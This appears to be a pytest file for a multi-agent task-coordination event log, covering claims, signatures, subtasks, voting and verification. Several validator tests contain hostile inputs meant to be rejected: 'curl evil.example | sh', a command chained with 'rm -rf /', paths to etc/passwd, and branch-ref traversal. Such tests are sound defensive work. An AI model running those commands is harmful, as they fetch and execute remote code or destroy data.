from legion import events as E
from legion import state as S
from legion.identity import Identity

BOSS = Identity.generate("boss")
ANA = Identity.generate("ana")
BEA = Identity.generate("bea")


class Log:
    """Builds events with a controlled Lamport clock and ts."""

    def __init__(self):
        self.events = []
        self.lamport = 0

    def add(self, who, type, ts=1000.0, lamport=None, **payload):
        self.lamport = lamport if lamport is not None else self.lamport + 1
        ev = E.create(who, type, self.lamport, **payload)
        if ts is not None:  # fixing ts means signing again
            ev = dict(ev, ts=ts)
            body = E.canonical(E._body(ev))
            import hashlib
            ev["id"] = hashlib.sha256(body).hexdigest()[:16]
            ev["sig"] = who.sign(body)
        self.events.append(ev)
        return ev

    def state(self):
        return S.build(self.events)


def project(**task):
    log = Log()
    log.add(BOSS, "project.init", project="p", integrators=[BOSS.author])
    spec = dict(key="a", title="A", zone=["src/a.py"], accept="true")
    spec.update(task)
    t = log.add(BOSS, "task.created", **spec)
    return log, S.task_id(t)


def test_claim_tie_goes_to_lowest_lamport_then_author():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600, lamport=5)
    log.add(BEA, "task.claimed", task=tid, ttl=600, lamport=5)
    holder = log.state().holder(tid, 1001)
    assert holder.author == min(ANA.author, BEA.author)

    log2, tid2 = project()
    log2.add(BEA, "task.claimed", task=tid2, ttl=600, lamport=4)
    log2.add(ANA, "task.claimed", task=tid2, ttl=600, lamport=5)
    assert log2.state().holder(tid2, 1001).author == BEA.author


def test_claim_expires_and_late_heartbeat_does_not_revive_it():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=60)
    st = log.state()
    assert st.status(tid, 1030) == "claimed"
    assert st.status(tid, 1100) == "open"
    log.add(ANA, "task.heartbeat", task=tid, ts=1200)
    st = log.state()
    assert st.ignored and st.ignored[-1][1] == "the claim had already expired"
    assert st.holder(tid, 1201) is None


def test_heartbeat_extends_claim():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=60)
    log.add(ANA, "task.heartbeat", task=tid, ts=1050)
    assert log.state().holder(tid, 1100).author == ANA.author


def test_only_integrators_create_tasks_or_judge():
    log, tid = project()
    log.add(ANA, "task.created", key="b", title="B", zone=["x"], accept="true")
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/b-1")
    log.add(ANA, "patch.accepted", patch=p["id"])
    st = log.state()
    assert len(st.tasks) == 1
    assert st.patches[p["id"]].verdict is None
    assert {why for _, why in st.ignored} == {"only an integrator can publish this event"}


def test_forged_events_are_ignored():
    log, tid = project()
    ev = log.add(ANA, "task.claimed", task=tid, ttl=600)
    ev["author"] = BEA.author  # impersonating someone else breaks the signature
    st = log.state()
    assert st.holder(tid, 1001) is None
    assert st.ignored[0][1] in ("the id does not match the content", "invalid signature")


def test_deps_block_until_accepted():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true", deps=[a]))
    assert log.state().status(b, 1001) == "blocked"
    p = log.add(ANA, "patch.submitted", task=a, commit="c", branch="legion/t/x-1")
    log.add(BOSS, "patch.accepted", patch=p["id"])
    st = log.state()
    assert st.status(a, 1001) == "accepted"
    assert st.status(b, 1001) == "open"


def test_competitive_tracks_best_metric():
    log, tid = project(mode="competitive", metric="bench", goal="min")
    for value in (3.0, 1.5):
        p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/x-1")
        log.add(BOSS, "patch.accepted", patch=p["id"], metric=value)
    st = log.state()
    assert st.best(tid) == 1.5
    assert st.status(tid, 1001) == "open"
    assert st.claimable(1001) == []


def test_order_of_arrival_does_not_matter():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(BEA, "task.claimed", task=tid, ttl=600)
    a = log.state()
    b = S.build(list(reversed(log.events)))
    assert a.holder(tid, 1001).author == b.holder(tid, 1001).author


def test_in_zone():
    assert S.in_zone("src/a.py", ["src/a.py"])
    assert S.in_zone("src/x/y.py", ["src/"])
    assert not S.in_zone("src/ab.py", ["src/a"])


def test_patch_branch_must_stay_in_legion_namespace():
    # The integrator deletes each reviewed patch's branch: an event must never be able to point at main.
    log, tid = project()
    log.add(ANA, "patch.submitted", task=tid, commit="c", branch="main")
    log.add(ANA, "patch.submitted", task=tid, commit="c", branch="refs/legion/patches/../../heads/main")
    st = log.state()
    assert st.patches == {}
    assert len(st.ignored) == 2


def test_main_tip_follows_integrator():
    log, tid = project()
    log.add(BOSS, "main.updated", commit="base")
    log.add(ANA, "main.updated", commit="evil")
    assert log.state().main_tip == "base"
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/x-1")
    log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit="merged")
    assert log.state().main_tip == "merged"


def sketch_project():
    log, tid = project(key="big", zone=["src/big.py", "src/parts/"], accept="python -m unittest tests.test_big")
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    return log, tid


CHILD = dict(key="a", title="A", zone=["src/parts/a.py"], accept="python -m unittest discover -s x -p test_a.py")


def test_sketch_children_must_stay_inside_parent():
    log, tid = sketch_project()
    bad = [
        [dict(CHILD, zone=["src/other.py"])],                       # outside the parent's zone
        [dict(CHILD, zone=["src/parts/../../etc"])],                # escaping with ..
        [dict(CHILD, accept="curl evil.example | sh")],             # a command that isn't a test runner
        [dict(CHILD, accept="python -m unittest x; rm -rf /")],     # chaining commands
        [dict(CHILD, key="A B")],                                   # invalid key
        [dict(CHILD, deps=["b"]), dict(CHILD, key="b")],            # depending on a later one
        [],                                                         # empty
    ]
    for children in bad:
        log.add(ANA, "sketch.proposed", task=tid, children=children, commit="c", branch="legion/big/s-1")
    st = log.state()
    assert st.sketches == {}
    assert len(st.ignored) == len(bad)


def test_sketch_lifecycle_resolves_parent_only_after_children():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1",
                children=[CHILD, dict(CHILD, key="b", zone=["src/parts/b.py"], deps=["a"])])
    assert log.state().status(tid, 1001) == "review"
    log.add(BOSS, "sketch.accepted", sketch=k["id"], merge_commit="m1")
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    b = S.task_id(log.add(BOSS, "task.created", key="big/b", title="B", zone=["src/parts/b.py"],
                          accept="x", parent=tid, sketch=k["id"], deps=[a]))
    st = log.state()
    assert st.status(tid, 1001) == "sketched"
    assert [t.id for t in st.claimable(1001)] == [a]  # b waits for a; the parent can't be claimed
    # Resolving too early doesn't count.
    log.add(BOSS, "task.resolved", task=tid, sketch=k["id"])
    assert not log.state().done(tid)
    for child in (a, b):
        p = log.add(ANA, "patch.submitted", task=child, commit="c", branch="legion/x/y-1")
        log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit="m")
    log.add(BOSS, "task.resolved", task=tid, sketch=k["id"])
    st = log.state()
    assert st.done(tid) and st.status(tid, 1001) == "accepted"


def test_failed_sketch_reopens_parent_and_cancels_unfinished_children():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1", children=[CHILD])
    log.add(BOSS, "sketch.accepted", sketch=k["id"])
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    log.add(BOSS, "sketch.failed", sketch=k["id"], reason="el test de arriba sigue fallando")
    st = log.state()
    assert st.status(a, 1001) == "cancelled"
    assert st.status(tid, 1001) in ("open", "claimed")
    assert st.exclusive_done() is False


def test_only_integrator_creates_children():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1", children=[CHILD])
    log.add(BOSS, "sketch.accepted", sketch=k["id"])
    log.add(ANA, "task.created", key="big/a", title="A", zone=["src/parts/a.py"], accept="x",
            parent=tid, sketch=k["id"])
    log.add(BOSS, "task.created", key="big/z", title="Z", zone=["src/other.py"], accept="x",
            parent=tid, sketch=k["id"])  # not even the integrator can move a subtask out of the zone
    assert log.state().children(tid) == []


def test_only_an_integrator_describes_the_project_and_the_latest_wins():
    log = Log()
    log.add(BOSS, "project.init", project="p", integrators=[BOSS.author], description="first")
    assert log.state().description == "first"
    log.add(ANA, "project.described", description="hijacked")
    log.add(BOSS, "project.described", description="second")
    log.add(BOSS, "project.described", description="x" * (E.MAX_DESCRIPTION + 1))
    st = log.state()
    assert st.description == "second"
    assert len(st.ignored) == 2


def stuck_project(**task):
    log, tid = sketch_project() if not task else project(**task)
    for i in range(S.STALL_AFTER):
        log.add(BEA, "attempt.reported", task=tid, outcome="failure", notes=f"tried {i}")
    return log, tid


def test_a_path_only_opens_on_a_stuck_task():
    log, tid = sketch_project()
    path = dict(children=[CHILD], notes="the direct approach keeps failing; build a helper first")
    log.add(BEA, "path.proposed", task=tid, **path)
    assert log.state().paths_for(tid) == []  # not stuck yet
    for i in range(S.STALL_AFTER):
        log.add(BEA, "attempt.reported", task=tid, outcome="failure", notes=f"tried {i}")
    st = log.state()
    assert st.stalled(tid)
    log.add(BEA, "path.proposed", task=tid, **path)
    assert len(log.state().paths_for(tid)) == 1


def test_a_path_adds_routes_without_taking_the_task_over():
    log, tid = stuck_project()
    k = log.add(BEA, "path.proposed", task=tid, children=[CHILD], notes="smaller case first")
    log.add(BOSS, "path.accepted", path=k["id"])
    child = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                              accept="x", parent=tid, path=k["id"]))
    st = log.state()
    assert st.tasks[child].parent == tid
    assert st.status(tid, 1001) == "claimed"  # ANA still holds it: a path doesn't block or replace the task
    assert not st.stalled(tid)  # an accepted path counts as progress
    p = log.add(BEA, "patch.submitted", task=child, commit="c", branch="legion/x/y-1")
    log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit="m")
    log.add(BOSS, "task.resolved", task=tid, sketch=k["id"])  # a path never resolves its task
    assert not log.state().done(tid)


def test_paths_work_on_competitive_tasks_and_are_limited():
    log, tid = stuck_project(key="record", zone=["src/"], accept="true", mode="competitive", metric="python m.py")
    for i in range(S.MAX_OPEN_PATHS + 1):
        log.add(BEA, "path.proposed", task=tid, notes="another idea",
                children=[dict(CHILD, key=f"idea{i}", zone=[f"src/idea{i}.py"])])
    st = log.state()
    assert len(st.paths_for(tid)) == S.MAX_OPEN_PATHS
    assert "paths under way" in st.ignored[-1][1]


def test_a_path_needs_notes_and_the_usual_subtask_rules():
    log, tid = stuck_project()
    log.add(BEA, "path.proposed", task=tid, children=[CHILD], notes="")
    log.add(BEA, "path.proposed", task=tid, children=[dict(CHILD, zone=["etc/passwd"])], notes="x")
    log.add(BEA, "path.proposed", task=tid, children=[dict(CHILD, accept="curl x | sh")], notes="x")
    assert log.state().paths_for(tid) == []


def test_a_project_can_allow_its_own_verifier_in_subtasks():
    log = Log()
    log.add(BOSS, "project.init", project="p", integrators=[BOSS.author],
            runners=S.DEFAULT_RUNNERS + ["python check.py"])
    t = S.task_id(log.add(BOSS, "task.created", key="big", title="Big", zone=["Lean/"], accept="python check.py big"))
    log.add(ANA, "task.claimed", task=t, ttl=600)
    child = dict(key="lemma", title="A lemma", zone=["Lean/Lemma.lean"], accept="python check.py --module Lean.Lemma")
    log.add(ANA, "sketch.proposed", task=t, children=[dict(child, accept="python evil.py")], commit="c",
            branch="legion/big/s-1")
    log.add(ANA, "sketch.proposed", task=t, children=[child], commit="c", branch="legion/big/s-2")
    st = log.state()
    assert len(st.sketches_for(t)) == 1
    assert "must start with one of" in st.ignored[0][1]


CEL, DAN = Identity.generate("cel"), Identity.generate("dan")


def test_idle_agents_join_the_hardest_task_up_to_a_limit():
    log, easy = project(size="S")
    assert log.state().policy["max_shared"] == S.MAX_SHARED == 8
    log.add(BOSS, "project.policy", max_shared=3)                      # the project sets how many
    hard = S.task_id(log.add(BOSS, "task.created", key="h", title="H", zone=["h"], accept="true", size="L"))
    log.add(ANA, "task.claimed", task=easy, ttl=600)
    log.add(BEA, "task.claimed", task=hard, ttl=600)
    st = log.state()
    assert [t.id for t in st.joinable(CEL.author, 1001)] == [hard, easy]  # the biggest first
    log.add(CEL, "task.claimed", task=hard, ttl=600, join=True)
    log.add(DAN, "task.claimed", task=hard, ttl=600, join=True)
    log.add(BOSS, "task.claimed", task=hard, ttl=600, join=True)  # a fourth: no room
    st = log.state()
    assert [c.author for c in st.claimants(hard, 1001)] == [BEA.author, CEL.author, DAN.author]
    assert st.works_on(hard, CEL.author, 1001) and not st.works_on(hard, BOSS.author, 1001)
    assert hard not in [t.id for t in st.joinable(BOSS.author, 1001)]
    assert [t.id for t in st.held_by(CEL.author, 1001)] == [hard]


def test_a_claim_that_doesnt_join_still_loses_the_race():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(BEA, "task.claimed", task=tid, ttl=600)
    assert [c.author for c in log.state().claimants(tid, 1001)] == [ANA.author]


def test_a_blocked_task_can_be_prepared_and_its_patch_waits():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true", deps=[a]))
    assert [t.id for t in log.state().preparable(1001)] == [b]
    log.add(ANA, "task.claimed", task=b, ttl=600)
    p = log.add(ANA, "patch.submitted", task=b, commit="c", branch="legion/t/b-1")
    st = log.state()
    assert st.status(b, 1001) == "blocked" and st.preparable(1001) == []
    assert st.held_by(ANA.author, 1001) == []  # its patch waits: ANA moves on
    q = log.add(BEA, "patch.submitted", task=a, commit="c", branch="legion/t/a-1")
    log.add(BOSS, "patch.accepted", patch=q["id"])
    assert log.state().status(b, 1001) == "review" and log.state().patches[p["id"]].verdict is None


def test_agents_on_a_task_talk_through_notes():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(BEA, "task.claimed", task=tid, ttl=600, join=True)
    log.add(ANA, "task.note", task=tid, text="I'm trying induction on m")
    log.add(BEA, "task.note", task=tid, text="then I take the counting route")
    log.add(CEL, "task.note", task=tid, text="spam")  # not working on it
    log.add(ANA, "task.note", task=tid, text="")
    st = log.state()
    assert [n["text"] for n in st.notes[tid]] == ["I'm trying induction on m", "then I take the counting route"]
    assert [why for _, why in st.ignored] == ["only someone who works on the task, or has, may post notes on it",
                                              f"a note is text of at most {E.MAX_NOTES} characters"]


def test_notes_per_agent_are_limited():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    for i in range(S.MAX_TASK_NOTES + 2):
        log.add(ANA, "task.note", task=tid, text=f"note {i}")
    assert len(log.state().notes[tid]) == S.MAX_TASK_NOTES


def test_unblocks_counts_dependents_and_parents_up_the_chain():
    log, tid = sketch_project()
    k = log.add(ANA, "sketch.proposed", task=tid, commit="c", branch="legion/big/s-1",
                children=[CHILD, dict(CHILD, key="b", zone=["src/parts/b.py"])])
    log.add(BOSS, "sketch.accepted", sketch=k["id"], merge_commit="m1")
    a = S.task_id(log.add(BOSS, "task.created", key="big/a", title="A", zone=["src/parts/a.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    b = S.task_id(log.add(BOSS, "task.created", key="big/b", title="B", zone=["src/parts/b.py"],
                          accept="x", parent=tid, sketch=k["id"]))
    later = S.task_id(log.add(BOSS, "task.created", key="later", title="L", zone=["l"], accept="x", deps=[tid]))
    last = S.task_id(log.add(BOSS, "task.created", key="last", title="Z", zone=["z"], accept="x", deps=[later]))
    lone = S.task_id(log.add(BOSS, "task.created", key="lone", title="O", zone=["o"], accept="x"))
    st = log.state()
    assert st.unblocks(a) == 3  # its parent, the task waiting for the parent, and the one after that
    assert st.unblocks(b) == 3 and st.unblocks(later) == 1 and st.unblocks(lone) == 0 and st.unblocks(last) == 0


def test_an_agent_whose_patch_waits_is_free_for_other_work():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    assert [t.id for t in log.state().held_by(ANA.author, 1001)] == [tid]
    log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/a-1")
    assert log.state().held_by(ANA.author, 1001) == []


def test_attempts_since_the_task_last_advanced():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(ANA, "attempt.reported", task=tid, outcome="failure", notes="no")
    log.add(ANA, "task.released", task=tid)
    st = log.state()
    assert st.attempts_by(tid, ANA.author) == 2 and st.attempts_by(tid, BEA.author) == 0


def test_competitive_tasks_are_handed_out_until_the_policys_attempts():
    log, fresh = project(key="c1", mode="competitive", metric="m", goal="min")
    assert log.state().policy["competitive_tries"] == S.COMPETITIVE_TRIES == 10
    log.add(BOSS, "project.policy", competitive_tries=3)               # the project sets how many
    done = S.task_id(log.add(BOSS, "task.created", key="c2", title="C2", zone=["c2"], accept="true",
                             mode="competitive", metric="m", goal="min"))
    p = log.add(BEA, "patch.submitted", task=done, commit="c", branch="legion/c2/b-1")
    log.add(BOSS, "patch.accepted", patch=p["id"], metric=5.0)
    assert [t.id for t in log.state().competitive_for(ANA.author)] == [fresh, done]  # no result yet first
    for _ in range(2):
        log.add(ANA, "attempt.reported", task=fresh, outcome="failure", notes="no gain")
    assert [t.id for t in log.state().competitive_for(ANA.author)] == [fresh, done]
    log.add(ANA, "attempt.reported", task=fresh, outcome="failure", notes="no gain")
    assert [t.id for t in log.state().competitive_for(ANA.author)] == [done]
    q = log.add(ANA, "patch.submitted", task=done, commit="c", branch="legion/c2/a-1")
    assert log.state().competitive_for(ANA.author) == []  # its patch waits for the verdict
    log.add(BOSS, "patch.accepted", patch=q["id"], metric=4.0)  # it improved: the count starts again
    assert [t.id for t in log.state().competitive_for(ANA.author)] == [done]


def test_a_blocked_task_someone_prepares_can_be_joined():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true", deps=[a]))
    log.add(ANA, "task.claimed", task=b, ttl=600)
    assert [t.id for t in log.state().joinable(BEA.author, 1001)] == [b]


TREE_A, TREE_B = "a" * 40, "b" * 40


def test_verifications_follow_their_rules():
    log, tid = project()
    p = log.add(ANA, "patch.submitted", task=tid, commit="c", branch="legion/t/a-1")
    ok = dict(task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="pass")
    log.add(BEA, "patch.verified", **ok)
    log.add(BEA, "patch.verified", **ok)                       # twice on the same tree
    log.add(ANA, "patch.verified", **ok)                       # its own patch
    log.add(CEL, "patch.verified", **dict(ok, outcome="maybe"))
    log.add(CEL, "patch.verified", **dict(ok, tree="not-a-tree"))
    log.add(BOSS, "project.policy", quorum=3, spot_check=0.5)
    log.add(BOSS, "project.policy", quorum=99)
    log.add(ANA, "project.policy", quorum=0)
    st = log.state()
    assert [v["author"] for v in st.verifications[p["id"]]] == [BEA.author]
    assert st.policy == dict(S.POLICY, quorum=3, spot_check=0.5)
    assert [why for _, why in st.ignored] == [
        "already verified on that tree", "a patch can't be verified by its own author", "outcome must be pass or fail",
        "base_tree and tree must be git tree ids", "quorum must be between 0 and 9",
        "only an integrator can publish this event"]


def test_a_subtree_lease_takes_its_tasks_from_the_project_lease():
    log, tid = project()
    other = S.task_id(log.add(BOSS, "task.created", key="o", title="O", zone=["o"], accept="true"))
    log.add(BOSS, "integrator.vote", action="add", key=ANA.author)
    log.add(BOSS, "integrator.lease", ttl=300)
    log.add(ANA, "integrator.lease", ttl=300, shard=tid)
    st = log.state()
    assert st.integrates(ANA.author, tid, 1001) and not st.integrates(BOSS.author, tid, 1001)
    assert st.integrates(BOSS.author, other, 1001) and not st.integrates(ANA.author, other, 1001)
    log.add(ANA, "integrator.release", project_lease=True)  # it held no project lease: its subtree stays
    assert log.state().integrates(ANA.author, tid, 1001)
    log.add(ANA, "integrator.release", shard=tid)
    assert log.state().integrates(BOSS.author, tid, 1001)


def test_who_took_part_may_talk_reply_and_mention():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    log.add(ANA, "attempt.reported", task=tid, outcome="failure", notes="induction loses a factor n")
    log.add(ANA, "task.released", task=tid)                      # ANA left the task, but took part in it
    q = log.add(ANA, "task.note", task=tid, text="@bea did the counting route close it?")
    log.add(BEA, "task.claimed", task=tid, ttl=600)
    st = log.state()
    assert [n["text"] for n in st.notes[tid]] == ["@bea did the counting route close it?"]
    assert [n["id"] for n in st.mentions("bea")] == [q["id"]]     # waiting for BEA's answer
    assert [n["id"] for n in st.mentions("bea#2")] == [q["id"]]   # @bea reaches all of bea's agents
    log.add(BEA, "task.note", task=tid, text="Not yet: it gives m >= 17.", reply=q["id"])
    log.add(BEA, "task.note", task=tid, text="x", reply="nope")
    st = log.state()
    assert st.mentions("bea") == [] and st.notes[tid][-1]["reply"] == q["id"]
    assert st.ignored[-1][1] == "a reply answers a note on the same task"


def test_a_task_opens_while_its_dependencies_are_in_review():
    log, a = project()
    b = S.task_id(log.add(BOSS, "task.created", key="b", title="B", zone=["b"], accept="true", deps=[a]))
    assert log.state().status(b, 1001) == "blocked"            # a has nothing in review yet
    pa = log.add(ANA, "patch.submitted", task=a, commit="c", branch="legion/t/a-1")
    st = log.state()
    assert st.status(b, 1001) == "open" and b in [t.id for t in st.claimable(1001)]
    assert [x.id for x in st.review_patches([a])] == [pa["id"]]
    log.add(BEA, "task.claimed", task=b, ttl=600)
    log.add(BEA, "patch.submitted", task=b, commit="d", branch="legion/t/b-1")
    assert log.state().status(b, 1001) == "blocked"            # b's own patch waits for a's verdict
    log.add(BOSS, "patch.rejected", patch=pa["id"], reason="tests fail", code="tests")
    assert log.state().status(b, 1001) == "blocked"            # a's patch is gone: b waits for a again


DAN = Identity.generate("dan")


def open_project():
    """An open-mode project where ANA and BEA are trusted (two accepted patches each) and CEL isn't."""
    log, tid = project()
    log.add(BOSS, "project.policy", mode="open", quorum=1)
    for who in (ANA, BEA):
        for i in range(2):
            t = S.task_id(log.add(BOSS, "task.created", key=f"w-{who.name}-{i}", title="w", zone=["w"], accept="true"))
            p = log.add(who, "patch.submitted", task=t, commit="c", branch=f"legion/w/{who.name}-{i}")
            log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit=f"m-{who.name}-{i}")
    return log, tid


def test_in_the_open_mode_a_trusted_node_accepts_on_another_owners_pass():
    log, tid = open_project()
    st = log.state()
    assert st.trusted(ANA.author) and st.trusted(BEA.author) and not st.trusted(CEL.author)
    p = log.add(CEL, "patch.submitted", task=tid, commit="c", branch="legion/t/c-1")
    log.add(ANA, "patch.accepted", patch=p["id"], merge_commit="m1")            # no verification behind it
    v = log.add(BEA, "patch.verified", task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="pass")
    log.add(DAN, "patch.accepted", patch=p["id"], merge_commit="m1", verified_by=[v["id"]])  # DAN isn't trusted
    log.add(ANA, "patch.accepted", patch=p["id"], merge_commit="m1", verified_by=[v["id"]], tree=TREE_B,
            base=log.state().main_tip)
    st = log.state()
    assert st.patches[p["id"]].verdict == "accepted" and st.main_tip == "m1"
    assert [why for _, why in st.ignored] == ["verified_by must list this patch's verifications",
                                              "only an integrator can publish this event"]


def test_a_challenge_by_two_trusted_owners_reverts_inside_the_window():
    log, tid = open_project()
    log.add(BOSS, "project.policy", quorum=1)
    p = log.add(CEL, "patch.submitted", task=tid, commit="c", branch="legion/t/c-1")
    v = log.add(BEA, "patch.verified", task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="pass")
    log.add(ANA, "patch.accepted", patch=p["id"], merge_commit="m1", verified_by=[v["id"]], tree=TREE_B,
            base=log.state().main_tip)
    fails = [log.add(who, "patch.verified", task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="fail")
             for who in (ANA, BOSS)]
    log.add(ANA, "patch.reverted", patch=p["id"], merge_commit="r1", verified_by=[f["id"] for f in fails], base="m1")
    st = log.state()
    assert st.patches[p["id"]].verdict == "reverted" and st.main_tip == "r1" and not st.done(tid)
    assert BEA.author in st.falsified and CEL.author in st.falsified and not st.trusted(BEA.author)
    late = log.add(ANA, "patch.verified", task=tid, patch=p["id"], base_tree=TREE_A, tree=TREE_B, outcome="fail",
                   ts=1000.0 + 2 * 86400)
    assert log.state().ignored[-1][0]["id"] == late["id"]  # past the window: no more audits


def trusted_crowd(n):
    """An open-mode project with n trusted agents (two accepted patches each), all active."""
    log, tid = project()
    log.add(BOSS, "project.policy", mode="open", quorum=1)
    crowd = [Identity.generate(f"agent{i}") for i in range(n)]
    for who in crowd:
        for j in range(2):
            t = S.task_id(log.add(BOSS, "task.created", key=f"w-{who.name}-{j}", title="w", zone=["w"], accept="true"))
            p = log.add(who, "patch.submitted", task=t, commit="c", branch=f"legion/w/{who.name}-{j}")
            log.add(BOSS, "patch.accepted", patch=p["id"], merge_commit=f"m-{who.name}-{j}")
    return log, crowd


def test_a_task_passes_by_a_majority_of_trusted_owners():
    log, crowd = trusted_crowd(4)  # 5 active trusted owners with BOSS: a majority is 3
    spec = dict(key="new", title="A new route", zone=["n"], accept="true")
    prop = log.add(crowd[0], "proposal.made", kind="task.created", payload=spec)
    log.add(crowd[1], "proposal.voted", proposal=prop["id"], yes=True)
    st = log.state()
    assert st.proposals[prop["id"]]["status"] == "open" and not st.find_task("new")
    log.add(CEL, "proposal.voted", proposal=prop["id"], yes=True)  # not trusted: doesn't count
    log.add(crowd[2], "proposal.voted", proposal=prop["id"], yes=True)
    st = log.state()
    assert st.proposals[prop["id"]]["status"] == "passed"
    assert st.find_task("new").id == S.task_id(prop)                # the same id on every node
    assert st.ignored[-1][1] == "only a trusted agent may propose or vote"


def test_a_proposed_task_carries_its_contract_and_waits_for_its_dependencies():
    log, crowd = trusted_crowd(4)  # a majority is 3
    test = "import unittest\n"
    base = dict(title="t", accept="python -m unittest discover -s legion_contracts/tail -p test_tail.py")
    tail = log.add(crowd[0], "proposal.made", kind="task.created",
                   payload=dict(base, key="tail", zone=["src/Tail.lean"], contract={"test_tail.py": test}))
    master = log.add(crowd[0], "proposal.made", kind="task.created",  # depends on a task not created yet
                     payload=dict(base, key="master", zone=["src/Master.lean"], deps=["tail"]))
    for p in (master, tail):  # master gets its votes first: it waits for tail
        for who in crowd[1:3]:
            log.add(who, "proposal.voted", proposal=p["id"], yes=True)
        if p is master:
            st = log.state()
            assert st.proposals[master["id"]]["status"] == "open" and not st.find_task("master")
            assert st.proposals[master["id"]]["reason"] == "waiting for tail to pass"
    st = log.state()
    assert st.find_task("tail").contract == {"test_tail.py": test}
    assert st.proposals[master["id"]]["status"] == "passed"
    assert st.find_task("master").deps == [st.find_task("tail").id]
    bad = [dict(base, key="a", zone=["legion_contracts/"], contract={"t.py": test}),  # its zone holds the contract
           dict(base, key="b", zone=["b"], contract={"../t.py": test}),                # a folder in the name
           dict(base, key="c", zone=["c"], deps=["nowhere"])]                          # no such task or proposal
    for payload in bad:
        log.add(crowd[0], "proposal.made", kind="task.created", payload=payload)
    assert [err for _, err in log.state().ignored[-3:]] == [
        "the zone can't include the contract's folder (legion_contracts/a)",
        "contract files have plain names (no folders) and text",
        "a dependency is a task, or the key of a task another open proposal creates"]


def test_a_subtask_can_be_voted_inside_its_parents_zone():
    log, crowd = trusted_crowd(4)  # a majority is 3
    uc = S.task_id(log.add(BOSS, "task.created", key="uc", title="upper constant", zone=["uc/"], accept="true"))
    spec = dict(key="uc/tail", title="t", zone=["uc/Tail.lean"], accept="true", parent=uc)
    prop = log.add(crowd[0], "proposal.made", kind="task.created", payload=spec)
    for who in crowd[1:3]:
        log.add(who, "proposal.voted", proposal=prop["id"], yes=True)
    st = log.state()
    tail = st.find_task("uc/tail")
    assert (tail.parent, tail.depth, tail.sketch) == (uc, 1, None) and [t.key for t in st.children(uc)] == ["uc/tail"]
    assert not st.done(uc) and st.status(uc, 2000.0) != "sketched"  # the parent still needs its own proof
    for payload in (dict(spec, key="uc/out", zone=["elsewhere.lean"]),   # leaves the parent's zone
                    dict(spec, key="other", zone=["uc/x.lean"]),         # doesn't carry its key
                    dict(spec, key="uc/s", sketch="abc")):               # pretends to come from a sketch
        log.add(crowd[0], "proposal.made", kind="task.created", payload=payload)
    assert [err for _, err in log.state().ignored[-3:]] == [
        "a subtask must carry its parent's key and stay inside its zone",
        "a subtask must carry its parent's key and stay inside its zone",
        "a voted subtask has a parent, not a sketch or a path"]


def test_saved_work_is_kept_per_author_for_whoever_takes_the_task_next():
    log, tid = project()
    log.add(ANA, "task.claimed", task=tid, ttl=600)
    first = log.add(ANA, "work.saved", task=tid, commit="c1", branch=f"refs/legion/patches/{tid}/wip-ana-1", notes="stage 1")
    log.add(ANA, "work.saved", task=tid, commit="c2", branch=f"refs/legion/patches/{tid}/wip-ana-2", notes="stage 2")
    log.add(BEA, "work.saved", task=tid, commit="c3", branch=f"refs/legion/patches/{tid}/wip-bea-1")  # never on it
    log.add(ANA, "work.saved", task=tid, commit="c4", branch="refs/heads/main")                        # not a patch ref
    st = log.state()
    assert [(w["name"], w["commit"], w["notes"]) for w in st.saves(tid)] == [("ana", "c2", "stage 2")]
    assert [w["id"] for w in st.saved[tid]][0] == first["id"]
    assert [(old["commit"], new["commit"]) for old, new in st.superseded_saves()] == [("c1", "c2")]
    assert [err for _, err in st.ignored[-2:]] == [
        "only someone who works on the task, or has, may save work on it",
        "missing commit, or the branch is outside the patch namespace"]


def test_the_policy_needs_two_thirds_and_a_founder_can_veto_early():
    log, crowd = trusted_crowd(5)  # 6 active owners: two thirds is 4
    prop = log.add(crowd[0], "proposal.made", kind="project.policy", payload={"window": 7200})
    for who in crowd[1:3]:
        log.add(who, "proposal.voted", proposal=prop["id"], yes=True)
    assert log.state().policy["window"] == 86400                     # 3 of 6: not yet
    log.add(crowd[3], "proposal.voted", proposal=prop["id"], yes=True)
    assert log.state().policy["window"] == 7200
    early = log.add(crowd[0], "proposal.made", kind="project.described", payload={"description": "hijack"})
